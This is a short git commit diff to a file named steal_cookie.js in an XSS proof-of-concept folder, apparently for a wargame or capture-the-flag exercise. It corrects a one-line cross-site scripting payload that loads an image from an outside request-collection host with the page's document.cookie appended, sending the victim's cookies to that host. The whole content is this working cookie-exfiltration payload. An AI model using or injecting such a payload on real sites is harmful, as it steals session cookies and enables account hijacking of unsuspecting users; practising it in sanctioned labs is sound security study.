471b6391279e11d34c471375593ec1e020ea8dfd
JUNG SOON HO <ajsoon98@naver.com>
2026-01-14 15:33:17 +0900

    Update steal_cookie.js

--- XSS_POC/steal_cookie.js
+++ XSS_POC/steal_cookie.js
@@ -1,1 +1,1 @@
-var i = new Image(); i.src = "https://pncffyj.request.dreamhack.games?cookie" + document.cookie;
+var i = new Image(); i.src = "https://pncffyj.request.dreamhack.games?cookie=" + document.cookie;
